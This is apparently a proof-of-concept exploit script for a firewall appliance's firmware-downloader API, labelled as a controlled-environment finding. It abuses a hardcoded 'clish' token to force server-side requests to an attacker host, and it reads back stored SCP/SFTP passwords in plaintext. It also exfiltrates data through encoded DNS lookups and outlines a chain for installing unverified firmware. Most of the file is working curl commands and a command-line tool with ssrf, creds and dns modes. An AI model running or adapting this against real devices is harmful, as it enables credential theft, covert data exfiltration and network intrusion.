"""
F-FTD-91: Platform API firmware downloader SSRF + credential exfiltration
CONTROLLED ENVIRONMENT ONLY

Root cause:
  SF/REST_API/Firmware.pm — post_firmwareDownloader():
    URL: http://127.0.0.1:5985/platform/api/sys/firmware/dnld/<filename>
    Method: POST
    Token: TOKEN: clish (or hm) — hardcoded, no JWT required (F-FTD-87)

    Parameters accepted:
      protocol: "tftp" | "scp" | "http" | "ftp" | "sftp"
      server:   arbitrary IP or hostname (attacker-controlled)
      foldername: path on server
      filename: firmware filename
      username: credentials for SCP/SFTP/FTP server
      password: credentials for SCP/SFTP/FTP server (PLAINTEXT)

  get_firmwareDownloader() reads back the downloader state INCLUDING the
  credentials stored during POST:
    GET /sys/firmware/dnld/<filename>
    → JSON with transferState, server, username, password fields

ATTACK SURFACES:

  1. SSRF — Firmware download trigger
     POST http://127.0.0.1:5985/platform/api/sys/firmware/dnld/evil.pkg
     Body: {firmwareDownloader: [{protocol:"http", server:"attacker.tld",
            foldername:"/", fileName:"evil.pkg", adminState:"restart"}]}
     → FTD initiates outbound HTTP/TFTP connection to attacker server
     → Reveals: FTD's egress IP, NAT configuration, internal routing
     → Timing oracle: confirms outbound connectivity to specific destinations
     → Can be used to exfiltrate data as DNS lookups (protocol="tftp",
       server="<data>.attacker.tld") — FTD resolves the hostname

  2. CREDENTIAL EXFILTRATION from firmware staging
     If a legitimate firmware staging operation was performed (admin staged
     firmware from SCP server), POST stores credentials:
       POST /sys/firmware/dnld/ftd-6.7.0-65.pkg
       Body: {..., username: "sftp-user", password: "SftpP@ss"}
     These credentials persist in the API state until cleared.
     GET /sys/firmware/dnld/ftd-6.7.0-65.pkg → returns password in response

     The Firmware.pm code logs: "username <$username>..." to stdout but
     NOT the password (intentionally). However the API layer stores both.

  3. SSRF to INTERNAL SERVICES
     protocol: "http" + server: "169.254.169.254" + foldername: "/metadata/"
     → FTD initiates request to Azure IMDS on behalf of attacker (proxy SSRF)
     → Or: server: "127.0.0.1" + port variation (if port param exists)
     → Or: server: "10.x.x.x" + scan internal hosts via timing/response

  4. SUPPLY CHAIN VECTOR (with F-FTD-71)
     F-FTD-71: verify_signed_image.sh -u flag skips signature verification
     F-FTD-91: firmware downloader fetches from attacker-controlled server
     COMBINED:
       a) POST /sys/firmware/dnld with attacker's server → FTD downloads evil firmware
       b) Trigger install with -u flag: sudo /var/sf/bin/verify_signed_image.sh -u <file>
       c) -u → unpack_only=yes → verify_image SKIPPED → evil firmware unpacked
     BUT: install_update.pl (the normal install path) DOES verify signatures.
     The -u bypass only works when verify_signed_image.sh is called directly
     (F-FTD-71 confirmed), not via install_update.pl.
     Result: can unpack evil firmware but standard install path still verifies.
     To complete: need root + direct installpkg call (F-FTD-85) or raw extraction.

  5. DNS EXFILTRATION
     POST with server = "<exfil-data>.attacker.tld"
     → FTD's resolver performs DNS lookup for attacker.tld → data in A record query
     → Works even if TCP/HTTP to attacker is blocked; requires only DNS egress

ATTACK:
  From www shell (post F-FTD-67, F-FTD-78, or other):

  # SSRF — trigger outbound HTTP to attacker:
  curl -s -H 'TOKEN: clish' -X POST \
    'http://127.0.0.1:5985/platform/api/sys/firmware/dnld/test.pkg' \
    -H 'Content-Type: application/json' \
    -d '{"firmwareDownloader":[{"adminState":"restart","dn":"sys/firmware/dnld/test.pkg",
          "fileName":"test.pkg","protocol":"http","server":"ATTACKER_IP",
          "foldername":"/","userName":"x","password":"x"}]}'
  # Monitor attacker HTTP server for incoming connection from FTD's egress IP

  # Read back staged credentials:
  curl -s -H 'TOKEN: clish' \
    'http://127.0.0.1:5985/platform/api/sys/firmware/dnld/ftd-6.7.0-65.pkg'
  # If firmware was previously staged with SCP/SFTP: returns username+password

  # DNS exfil:
  curl -s -H 'TOKEN: clish' -X POST \
    'http://127.0.0.1:5985/platform/api/sys/firmware/dnld/exfil.pkg' \
    -d '{"firmwareDownloader":[{"adminState":"restart","dn":"...","fileName":"x",
          "protocol":"tftp","server":"<encoded-data>.attacker.tld","foldername":"/"}]}'

VERIFY (controlled environment):
  # Confirm endpoint accessibility:
  curl -s -H 'TOKEN: clish' \
    'http://127.0.0.1:5985/platform/api/sys/firmware/dnld/' 2>&1

  # Confirm parameter acceptance (dry run, no exfil):
  curl -s -H 'TOKEN: clish' -X POST \
    'http://127.0.0.1:5985/platform/api/sys/firmware/dnld/test.pkg' \
    -H 'Content-Type: application/json' \
    -d '{"firmwareDownloader":[{"adminState":"restart","dn":"sys/firmware/dnld/test.pkg",
          "fileName":"test.pkg","protocol":"tftp","server":"127.0.0.1",
          "foldername":"/tmp","userName":"","password":""}]}'

Affected: FTD 6.7.0-65 (SF/REST_API/Firmware.pm, TOKEN: clish confirmed)
Severity: HIGH — SSRF from www shell to arbitrary internal/external hosts;
          credential exfiltration of SCP/SFTP credentials from firmware staging;
          DNS exfiltration channel bypasses network egress controls
Auth required: www shell (post F-FTD-67, F-FTD-78, or equivalent)
"""

# CONTROLLED ENVIRONMENT ONLY

import sys
import json
import subprocess


PLATFORM_API_BASE = "http://127.0.0.1:5985/platform/api"
CLI_TOKEN = "clish"


def _api_post(path, body, token=CLI_TOKEN):
    url = f"{PLATFORM_API_BASE}/{path.lstrip('/')}"
    cmd = ["curl", "-s", "-X", "POST",
           "-H", f"TOKEN: {token}",
           "-H", "Content-Type: application/json",
           "-d", json.dumps(body), url]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
    return result.stdout, result.returncode


def _api_get(path, token=CLI_TOKEN):
    url = f"{PLATFORM_API_BASE}/{path.lstrip('/')}"
    cmd = ["curl", "-s", "-H", f"TOKEN: {token}", url]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
    return result.stdout, result.returncode


def trigger_ssrf(attacker_host, protocol="http", filename="ssrf_probe.pkg"):
    """
    Trigger outbound connection from FTD to attacker-controlled host.
    Monitor attacker server for incoming connection from FTD's egress IP.
    CONTROLLED ENVIRONMENT ONLY.
    """
    print(f"[*] F-FTD-91: SSRF — triggering outbound {protocol.upper()} to {attacker_host}")
    print(f"    Monitor: {attacker_host} for incoming {protocol.upper()} connection")

    body = {
        "firmwareDownloader": [{
            "adminState": "restart",
            "dn": f"sys/firmware/dnld/{filename}",
            "fileName": filename,
            "protocol": protocol,
            "server": attacker_host,
            "foldername": "/",
            "userName": "probe",
            "password": "probe",
        }]
    }

    print(f"    POST {PLATFORM_API_BASE}/sys/firmware/dnld/{filename}")
    out, rc = _api_post(f"/sys/firmware/dnld/{filename}", body)
    print(f"    Response: {out[:200]}")

    if rc == 0:
        print(f"[*] Request sent. Check {attacker_host} for incoming connection.")
        print(f"    If connection received: FTD's egress IP is the source address")


def read_staged_creds(filename=None):
    """
    Read credentials from previously staged firmware download.
    CONTROLLED ENVIRONMENT ONLY.
    """
    if filename:
        print(f"[*] F-FTD-91: Reading staged creds for: {filename}")
        out, _ = _api_get(f"/sys/firmware/dnld/{filename}")
        try:
            data = json.loads(out)
            dl = data.get('firmwareDownloader', [{}])[0]
            print(f"[!!!] Staged firmware entry found:")
            print(f"    Server:   {dl.get('server')}")
            print(f"    Protocol: {dl.get('protocol')}")
            print(f"    Folder:   {dl.get('foldername')}")
            print(f"    User:     {dl.get('userName')}")
            print(f"    Password: {dl.get('password')}")   # plaintext
            print(f"    State:    {dl.get('transferState')}")
        except Exception:
            print(f"    Raw: {out[:300]}")
    else:
        print(f"[*] F-FTD-91: Listing all staged firmware downloads")
        out, _ = _api_get("/sys/firmware/dnld/")
        print(f"    {out[:500]}")


def dns_exfil(data_str, attacker_domain, filename="exfil.pkg"):
    """
    Exfiltrate data via DNS lookup triggered by firmware downloader SSRF.
    FTD resolves attacker domain containing encoded data.
    CONTROLLED ENVIRONMENT ONLY.
    """
    import base64
    encoded = base64.b32encode(data_str.encode()).decode().rstrip('=').lower()
    dns_host = f"{encoded}.{attacker_domain}"
    print(f"[*] F-FTD-91: DNS exfil — FTD will resolve: {dns_host}")
    print(f"    Monitor {attacker_domain} DNS server for query")

    body = {
        "firmwareDownloader": [{
            "adminState": "restart",
            "dn": f"sys/firmware/dnld/{filename}",
            "fileName": filename,
            "protocol": "tftp",
            "server": dns_host,
            "foldername": "/",
            "userName": "",
            "password": "",
        }]
    }

    out, _ = _api_post(f"/sys/firmware/dnld/{filename}", body)
    print(f"    Response: {out[:100]}")


def print_attack_summary():
    print("""
F-FTD-91: Platform API Firmware Downloader SSRF + Credential Exfil
===================================================================

Endpoint: http://127.0.0.1:5985/platform/api/sys/firmware/dnld/<filename>
Token:    TOKEN: clish (hardcoded — F-FTD-87)

POST parameters:
  protocol:   tftp|scp|http|ftp|sftp
  server:     arbitrary IP or hostname (attacker-controlled)
  foldername: arbitrary path
  username:   SCP/SFTP/FTP credentials
  password:   SCP/SFTP/FTP credentials (stored plaintext, readable via GET)

ATTACK VECTORS:

1. SSRF: FTD initiates outbound connection to attacker-controlled host
   → Reveals egress IP, confirms outbound connectivity

2. Credential exfil: Read back SCP/SFTP credentials from staged firmware ops
   GET /sys/firmware/dnld/<filename> → returns username + password plaintext

3. DNS exfil: server = "<encoded-data>.<attacker>.tld"
   → FTD's resolver leaks data via DNS query, bypasses TCP egress controls

4. Supply chain (with F-FTD-71): Download evil firmware from attacker server,
   install with -u flag (skip verification) + F-FTD-85 installpkg
""")


if __name__ == "__main__":
    print("=" * 70)
    print("F-FTD-91: Platform API firmware downloader SSRF + credential exfil")
    print("CONTROLLED ENVIRONMENT ONLY")
    print("=" * 70)

    mode = sys.argv[1] if len(sys.argv) > 1 else "show"

    if mode == "show":
        print_attack_summary()

    elif mode == "ssrf":
        if len(sys.argv) < 3:
            print(f"Usage: {sys.argv[0]} ssrf <attacker-host> [protocol]")
            sys.exit(1)
        host = sys.argv[2]
        proto = sys.argv[3] if len(sys.argv) > 3 else "http"
        trigger_ssrf(host, proto)

    elif mode == "creds":
        filename = sys.argv[2] if len(sys.argv) > 2 else None
        read_staged_creds(filename)

    elif mode == "dns":
        if len(sys.argv) < 4:
            print(f"Usage: {sys.argv[0]} dns <data> <attacker-domain>")
            sys.exit(1)
        dns_exfil(sys.argv[2], sys.argv[3])

    print("\n[*] CONTROLLED ENVIRONMENT ONLY.")
